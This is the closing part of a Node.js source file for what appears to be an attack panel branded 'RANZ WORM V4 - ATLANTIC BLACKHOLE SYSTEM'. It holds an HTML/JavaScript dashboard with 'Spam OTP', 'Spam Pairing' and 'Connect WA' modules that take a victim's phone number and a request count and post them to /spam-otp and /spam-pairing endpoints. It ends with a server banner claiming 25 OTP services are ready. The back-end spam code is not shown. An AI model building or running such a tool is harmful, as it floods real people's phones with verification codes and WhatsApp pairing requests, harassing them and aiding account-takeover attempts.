            border: 1px solid rgba(255,255,255,0.08); border-radius: 10px;
            color: white; font-size: 14px; outline: none; transition: all 0.3s;
            font-family: 'JetBrains Mono', monospace;
        }
        .input-field:focus { border-color: #8b5cf6; box-shadow: 0 0 15px rgba(139,92,246,0.1); }
        .btn {
            width: 100%; padding: 14px; border: none; border-radius: 12px;
            color: white; font-size: 14px; font-weight: 600; cursor: pointer;
            transition: all 0.3s; font-family: 'Orbitron', sans-serif; letter-spacing: 2px;
        }
        .btn-danger { background: linear-gradient(135deg, #ef4444, #dc2626); }
        .btn-danger:hover { box-shadow: 0 10px 25px rgba(239,68,68,0.4); transform: translateY(-2px); }
        .btn:disabled { opacity: 0.4; cursor: not-allowed; transform: none !important; }
        .progress-container { margin: 12px 0; display: none; }
        .progress-container.show { display: block; }
        .progress-bar-bg {
            width: 100%; height: 4px; background: rgba(255,255,255,0.05);
            border-radius: 2px; overflow: hidden;
        }
        .progress-bar-fill {
            height: 100%; background: linear-gradient(90deg, #8b5cf6, #ec4899);
            border-radius: 2px; transition: width 0.3s; width: 0%;
        }
        .progress-text {
            font-size: 10px; color: rgba(255,255,255,0.4); font-family: 'JetBrains Mono', monospace;
            text-align: right; margin-top: 4px;
        }
        .log-box {
            margin-top: 12px; padding: 12px; background: rgba(0,0,0,0.4);
            border: 1px solid rgba(255,255,255,0.04); border-radius: 10px;
            max-height: 250px; overflow-y: auto; font-size: 10px;
            font-family: 'JetBrains Mono', monospace; color: rgba(255,255,255,0.5);
            display: none;
        }
        .log-box.show { display: block; }
        .log-entry { padding: 4px 0; border-bottom: 1px solid rgba(255,255,255,0.02); }
        .log-entry.success { color: #22c55e; }
        .log-entry.error { color: #ef4444; }
        .log-entry.info { color: #8b5cf6; }
        .status-badge {
            display: none; padding: 6px 12px; border-radius: 20px; font-size: 10px;
            font-family: 'JetBrains Mono', monospace; letter-spacing: 1px;
            margin: 8px 0; text-align: center;
        }
        .status-badge.processing { background: rgba(234,179,8,0.2); color: #eab308; border: 1px solid rgba(234,179,8,0.3); }
        .status-badge.complete { background: rgba(34,197,94,0.2); color: #22c55e; border: 1px solid rgba(34,197,94,0.3); }
        .status-badge.show { display: block; }
        .pairing-code {
            display: none; padding: 14px; background: rgba(0,0,0,0.5);
            border: 1px solid rgba(139,92,246,0.3); border-radius: 10px;
            text-align: center; font-family: 'Orbitron', monospace; font-size: 16px;
            color: #8b5cf6; letter-spacing: 3px; margin: 8px 0;
        }
        .pairing-code.show { display: block; }
        .footer-text {
            text-align: center; margin-top: 20px; font-size: 10px;
            letter-spacing: 3px; color: rgba(255,255,255,0.1);
            font-family: 'Orbitron', sans-serif;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="card-content">
                <div class="header">
                    <div>
                        <div class="title">DASHBOARD</div>
                        <div class="subtitle">Atlantic System v4</div>
                        <div class="user-badge" id="user-badge" style="margin-top:8px;">Not logged in</div>
                    </div>
                    <button class="logout-btn" onclick="logout()">EXIT</button>
                </div>

                <div class="menu-label">Select Module</div>
                <div class="menu-grid">
                    <div class="menu-item" data-menu="otp" onclick="selectMenu('otp', this)">
                        <span class="menu-icon">📱</span>Spam OTP
                    </div>
                    <div class="menu-item" data-menu="pairing" onclick="selectMenu('pairing', this)">
                        <span class="menu-icon">🔗</span>Spam Pairing
                    </div>
                    <div class="menu-item" data-menu="connect" onclick="selectMenu('connect', this)">
                        <span class="menu-icon">📡</span>Connect WA
                    </div>
                </div>

                <div class="target-section" id="target-section">
                    <div class="menu-label" id="section-title">Target</div>

                    <div class="input-group">
                        <label class="input-label">Phone Number</label>
                        <input type="text" class="input-field" id="target-input" placeholder="628xxxxxxxxxx">
                    </div>

                    <div class="input-group" id="count-group">
                        <label class="input-label">Amount (Max 50)</label>
                        <input type="number" class="input-field" id="count-input" value="10" min="1" max="50">
                    </div>

                    <div class="status-badge processing" id="status-processing">PROCESSING...</div>
                    <div class="status-badge complete" id="status-complete">COMPLETE</div>

                    <div class="progress-container" id="progress-container">
                        <div class="progress-bar-bg"><div class="progress-bar-fill" id="progress-fill"></div></div>
                        <div class="progress-text" id="progress-text">0%</div>
                    </div>

                    <div class="pairing-code" id="pairing-display">
                        <div style="font-size:10px;color:rgba(255,255,255,0.4);margin-bottom:4px;">PAIRING CODE</div>
                        <div id="pairing-code-text">----</div>
                    </div>

                    <button class="btn btn-danger" id="send-btn" onclick="execute()">EXECUTE</button>

                    <div class="log-box" id="log-box"></div>
                </div>
            </div>
        </div>
        <div class="footer-text">✦ Ranzkecebet ✦</div>
    </div>

    <script>
        let currentUser = null;
        let selectedMenu = null;
        let eventSource = null;
        let isProcessing = false;

        async function checkSession() {
            try {
                const res = await fetch('/check-session');
                const data = await res.json();
                if (data.status === 'success') {
                    currentUser = data;
                    document.getElementById('user-badge').textContent = '@' + data.username;
                    connectSSE(data.username);
                } else {
                    window.location.href = '/';
                }
            } catch(e) { window.location.href = '/'; }
        }
        checkSession();

        function connectSSE(username) {
            if (eventSource) eventSource.close();
            eventSource = new EventSource('/events?username=' + encodeURIComponent(username));
            eventSource.onmessage = function(e) {
                try { handleEvent(JSON.parse(e.data)); } catch(ex) {}
            };
            eventSource.onerror = () => setTimeout(() => connectSSE(username), 5000);
        }

        function handleEvent(data) {
            const logBox = document.getElementById('log-box');
            const progressFill = document.getElementById('progress-fill');
            const progressText = document.getElementById('progress-text');
            const progressContainer = document.getElementById('progress-container');

            if (data.progress !== undefined) {
                progressContainer.classList.add('show');
                progressFill.style.width = data.progress + '%';
                progressText.textContent = data.progress + '%';
            }

            if (data.type === 'otp_result' || data.type === 'pairing_result') {
                logBox.classList.add('show');
                const cls = data.status === 'sent' ? 'success' : 'error';
                let msg = '#' + data.result.number + ' | ';
                if (data.type === 'otp_result') msg += data.result.service + ' | ';
                msg += data.result.code || data.result.message || data.status;
                logBox.innerHTML += '<div class="log-entry ' + cls + '">' + msg + '</div>';
                logBox.scrollTop = logBox.scrollHeight;

                if (data.result.code && data.result.code !== 'N/A') {
                    document.getElementById('pairing-display').classList.add('show');
                    document.getElementById('pairing-code-text').textContent = data.result.code;
                }
            }

            if (data.type === 'status') {
                logBox.classList.add('show');
                logBox.innerHTML += '<div class="log-entry info">' + data.message + '</div>';
                logBox.scrollTop = logBox.scrollHeight;
            }

            if (data.type === 'complete') {
                isProcessing = false;
                document.getElementById('send-btn').disabled = false;
                document.getElementById('send-btn').textContent = 'EXECUTE';
                document.getElementById('status-processing').classList.remove('show');
                document.getElementById('status-complete').classList.add('show');
                logBox.innerHTML += '<div class="log-entry success">✅ ' + data.message + '</div>';
                logBox.scrollTop = logBox.scrollHeight;
                setTimeout(() => document.getElementById('status-complete').classList.remove('show'), 5000);
            }

            if (data.type === 'error') {
                logBox.classList.add('show');
                logBox.innerHTML += '<div class="log-entry error">❌ ' + data.message + '</div>';
                logBox.scrollTop = logBox.scrollHeight;
            }

            if (data.type === 'pairing_code') {
                document.getElementById('pairing-display').classList.add('show');
                document.getElementById('pairing-code-text').textContent = data.code;
                logBox.classList.add('show');
                logBox.innerHTML += '<div class="log-entry info">🔑 Code: ' + data.code + '</div>';
                logBox.scrollTop = logBox.scrollHeight;
            }
        }

        function selectMenu(menu, el) {
            selectedMenu = menu;
            document.querySelectorAll('.menu-item').forEach(e => e.classList.remove('active'));
            el.classList.add('active');
            const section = document.getElementById('target-section');
            const title = document.getElementById('section-title');
            const countGroup = document.getElementById('count-group');
            section.classList.add('show');
            resetUI();

            if (menu === 'otp') {
                title.textContent = 'Spam OTP Target';
                countGroup.style.display = 'block';
            } else if (menu === 'pairing') {
                title.textContent = 'Spam Pairing Target';
                countGroup.style.display = 'block';
            } else if (menu === 'connect') {
                title.textContent = 'Connect WhatsApp';
                countGroup.style.display = 'none';
            }
        }

        function resetUI() {
            document.getElementById('log-box').innerHTML = '';
            document.getElementById('log-box').classList.remove('show');
            document.getElementById('pairing-display').classList.remove('show');
            document.getElementById('pairing-code-text').textContent = '----';
            document.getElementById('progress-fill').style.width = '0%';
            document.getElementById('progress-text').textContent = '0%';
            document.getElementById('progress-container').classList.remove('show');
            document.getElementById('status-processing').classList.remove('show');
            document.getElementById('status-complete').classList.remove('show');
        }

        async function execute() {
            if (!currentUser) return alert('Session expired.');
            if (!selectedMenu) return alert('Select a module.');
            if (isProcessing) return alert('Still processing...');

            const target = document.getElementById('target-input').value.trim();
            if (!target) return alert('Enter phone number.');

            isProcessing = true;
            const btn = document.getElementById('send-btn');
            btn.disabled = true;
            btn.textContent = 'PROCESSING...';
            resetUI();

            document.getElementById('status-processing').classList.add('show');
            document.getElementById('progress-container').classList.add('show');
            document.getElementById('log-box').classList.add('show');

            const logBox = document.getElementById('log-box');
            logBox.innerHTML += '<div class="log-entry info">🚀 Starting...</div>';

            let endpoint, body;

            if (selectedMenu === 'otp') {
                const count = parseInt(document.getElementById('count-input').value) || 10;
                endpoint = '/spam-otp';
                body = { target, count: Math.min(count, 50), username: currentUser.username };
            } else if (selectedMenu === 'pairing') {
                const count = parseInt(document.getElementById('count-input').value) || 5;
                endpoint = '/spam-pairing';
                body = { target, count: Math.min(count, 50), username: currentUser.username };
            } else if (selectedMenu === 'connect') {
                endpoint = '/connect-whatsapp';
                body = { target, username: currentUser.username };
            }

            try {
                const res = await fetch(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(body)
                });
                const data = await res.json();
                if (data.status === 'error') {
                    logBox.innerHTML += '<div class="log-entry error">❌ ' + data.message + '</div>';
                    isProcessing = false;
                    btn.disabled = false;
                    btn.textContent = 'EXECUTE';
                }
            } catch(err) {
                logBox.innerHTML += '<div class="log-entry error">❌ ' + err.message + '</div>';
                isProcessing = false;
                btn.disabled = false;
                btn.textContent = 'EXECUTE';
            }
        }

        function logout() {
            document.cookie = 'session=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
            window.location.href = '/';
        }
    </script>
</body>
</html>`;

// =============================================
// PRINT BANNER & START SERVER
// =============================================

function printBanner() {
    console.clear();
    console.log('');
    console.log(`${c.bgMagenta}${c.bright}${c.white} ╔══════════════════════════════════════════════════════════════╗ ${c.reset}`);
    console.log(`${c.bgMagenta}${c.bright}${c.white} ║    🐍 RANZ WORM V4 - ATLANTIC BLACKHOLE SYSTEM 🐍         ║ ${c.reset}`);
    console.log(`${c.bgMagenta}${c.bright}${c.white} ║    Engineered by Ranzkecebet | Owner Mode                 ║ ${c.reset}`);
    console.log(`${c.bgMagenta}${c.bright}${c.white} ╚══════════════════════════════════════════════════════════════╝ ${c.reset}`);
    console.log('');
    console.log(`${c.cyan}[+]${c.reset} Bot Token: ${c.yellow}${BOT_TOKEN.substring(0, 20)}...${c.reset}`);
    console.log(`${c.cyan}[+]${c.reset} Owner ID: ${c.yellow}${OWNER_ID}${c.reset}`);
    console.log(`${c.cyan}[+]${c.reset} Server Port: ${c.yellow}${PORT}${c.reset}`);
    console.log(`${c.cyan}[+]${c.reset} Spam OTP APIs: ${c.green}25 Services Ready${c.reset}`);
    console.log(`${c.cyan}[+]${c.reset} Spam Pairing: ${c.green}Multiple Mode${c.reset}`);
    console.log(`${c.cyan}[+]${c.reset} WhatsApp Connect: ${c.green}Ready${c.reset}`);
    console.log(`${c.cyan}[+]${c.reset} Bot Status: ${c.green}Active${c.reset}`);
    console.log('');
}

app.listen(PORT, '0.0.0.0', () => {
    printBanner();
    logToFile('Server started on port ' + PORT);
});

process.on('SIGINT', () => { console.log(`\n${c.yellow}Shutting down...${c.reset}`); bot.stopPolling(); process.exit(0); });
process.on('uncaughtException', (err) => { console.log(`${c.red}[ERROR]${c.reset} ${err.message}`); });
